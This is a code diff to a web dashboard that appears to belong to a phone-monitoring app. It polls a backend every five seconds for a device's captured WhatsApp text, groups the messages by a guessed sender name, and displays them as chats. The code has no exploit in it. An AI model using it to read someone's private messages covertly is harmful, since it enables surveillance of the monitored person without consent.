@@ -111,9 +111,10 @@
 
     <script>
         const DEVICE_ID = localStorage.getItem('monitoring_id');
-        
-        // --- 1. FIXED BASE URL (Added /api/get-data) ---
         const BASE_URL = "https://child-v9no.onrender.com/api/get-data"; 
+        
+        // 🔥 UPDATE: Ab hum generic 'chat_logs' nahi, specific 'whatsapp' maangenge
+        const DATA_TYPE = "whatsapp";
 
         if (!DEVICE_ID) {
             alert("Device ID Missing!");
@@ -125,36 +126,30 @@
         async function fetchWhatsAppData() {
             const statusText = document.getElementById('statusText');
             
-            // Server wake up message logic
-            setTimeout(() => {
-                if(statusText) statusText.innerText = "Waking up server (Wait 30s)...";
-            }, 3000);
-
             try {
-                // --- 2. FIXED FETCH URL STRUCTURE ---
-                // Backend Route: /api/get-data/:device_id/:type
-                // Hum 'chat_logs' mangwa rahe hain kyunki wahi data save hota hai
-                const finalUrl = `${BASE_URL}/${DEVICE_ID}/chat_logs`;
+                // 🔥 URL UPDATE: chat_logs -> whatsapp
+                const finalUrl = `${BASE_URL}/${DEVICE_ID}/${DATA_TYPE}`;
                 
-                console.log("Fetching:", finalUrl); // Debugging ke liye
+                // console.log("Fetching:", finalUrl); 
 
                 const response = await fetch(finalUrl);
                 const result = await response.json();
 
-                // Backend array return karega, isliye check array ka lagaya hai
                 if (Array.isArray(result) && result.length > 0) {
                     processLogs(result);
                 } else {
-                    document.getElementById('contactsContainer').innerHTML = "<p style='text-align:center; color:#888; margin-top:20px'>No Data Found</p>";
+                    document.getElementById('contactsContainer').innerHTML = "<p style='text-align:center; color:#888; margin-top:20px'>No WhatsApp Data Yet</p>";
                 }
             } catch (error) {
                 console.error("Fetch Error:", error);
-                document.getElementById('contactsContainer').innerHTML = 
-                    `<div style='text-align:center; color:#ff5f5f; margin-top:50px'>
-                        <i class="fa-solid fa-triangle-exclamation" style="font-size:2rem; margin-bottom:10px;"></i><br>
-                        Connection Error.<br>Server might be sleeping.<br>
-                        <button onclick="location.reload()" style="background:#00a884; color:white; border:none; padding:8px 15px; margin-top:10px; border-radius:5px;">Retry</button>
-                    </div>`;
+                // Agar pehli baar load ho raha hai tabhi error dikhao, baar baar nahi
+                if(document.getElementById('statusText')){
+                    document.getElementById('contactsContainer').innerHTML = 
+                        `<div style='text-align:center; color:#ff5f5f; margin-top:50px'>
+                            <i class="fa-solid fa-wifi" style="font-size:2rem; margin-bottom:10px;"></i><br>
+                            Waiting for data...
+                        </div>`;
+                }
             }
         }
 
@@ -163,37 +158,39 @@
             // Sort Old -> New
             logs.sort((a, b) => (a.time || 0) - (b.time || 0));
 
-            let currentSender = "Recent Messages"; 
+            let currentSender = "Unknown"; 
 
             logs.forEach(log => {
-                // Backend server 'chat_logs' bhej raha hai, usme 'app' check karna zaroori hai
-                if (log.app === 'WhatsApp') {
-                    let text = (log.text || "").trim();
-                    let time = log.time || Date.now();
+                // 🔥 UPDATE: Ab log.app check karne ki zarurat nahi, kyunki file hi whatsapp ki hai
+                let text = (log.text || "").trim();
+                let time = log.time || Date.now();
 
-                    // --- FILTERING (Kachra Hatao) ---
-                    if (text.includes("last seen") || text.includes("online") || 
-                        text.includes("typing") || /^\d{1,2}:\d{2}\s?(am|pm)$/i.test(text)) {
-                        return; 
-                    }
+                // --- FILTER GARBAGE (Ye zaroori hai) ---
+                if (text.length < 1) return;
+                if (text.includes("last seen") || text.includes("online") || 
+                    text.includes("typing") || text.includes("WhatsApp") ||
+                    /^\d{1,2}:\d{2}\s?(am|pm)$/i.test(text)) {
+                    return; 
+                }
 
-                    // --- NAME LOGIC ---
-                    if (text.length < 20 && !text.includes(" ") && !text.includes("http") && isNaN(text)) {
-                        currentSender = text; 
-                        if (!groupedChats[currentSender]) {
-                            groupedChats[currentSender] = { name: currentSender, lastMsg: "Active", time: time, msgs: [] };
-                        }
-                    } else {
-                        if (!groupedChats[currentSender]) {
-                            groupedChats[currentSender] = { name: currentSender, lastMsg: "", time: time, msgs: [] };
-                        }
-                        groupedChats[currentSender].msgs.push({
-                            text: text,
-                            timeStr: new Date(time).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
-                        });
-                        groupedChats[currentSender].lastMsg = text;
-                        groupedChats[currentSender].time = time;
+                // --- NAME LOGIC (Sender ka naam pakadne ki koshish) ---
+                // Agar text chhota hai aur number nahi hai, toh shayad ye naam hai (Header)
+                if (text.length < 25 && !text.includes("http") && isNaN(text) && !text.includes(":")) {
+                    currentSender = text; 
+                    if (!groupedChats[currentSender]) {
+                        groupedChats[currentSender] = { name: currentSender, lastMsg: "Active", time: time, msgs: [] };
                     }
+                } else {
+                    // Ye message body hai
+                    if (!groupedChats[currentSender]) {
+                        groupedChats[currentSender] = { name: currentSender, lastMsg: "", time: time, msgs: [] };
+                    }
+                    groupedChats[currentSender].msgs.push({
+                        text: text,
+                        timeStr: new Date(time).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
+                    });
+                    groupedChats[currentSender].lastMsg = text;
+                    groupedChats[currentSender].time = time;
                 }
             });
 
@@ -205,16 +202,17 @@
             const names = Object.keys(groupedChats);
 
             if (names.length === 0) {
-                container.innerHTML = "<p style='text-align:center; padding-top:20px; color:#888'>No WhatsApp chats found in logs.</p>";
+                container.innerHTML = "<p style='text-align:center; padding-top:20px; color:#888'>Data found but no clear chats.</p>";
                 return;
             }
 
+            // Newest chat on top
             names.sort((a, b) => groupedChats[b].time - groupedChats[a].time);
 
             let html = "";
             names.forEach(name => {
                 const chat = groupedChats[name];
-                if(chat.msgs.length === 0 && name === "Recent Messages") return; 
+                if(chat.msgs.length === 0 && name === "Unknown") return; 
 
                 html += `
                     <div class="contact-item" onclick="openChat('${name}')">
@@ -257,8 +255,8 @@
 
         // Start Fetching
         fetchWhatsAppData();
-        // Refresh every 7 seconds
-        setInterval(fetchWhatsAppData, 7000); 
+        // Refresh every 5 seconds
+        setInterval(fetchWhatsAppData, 5000); 
 
     </script>
 </body>
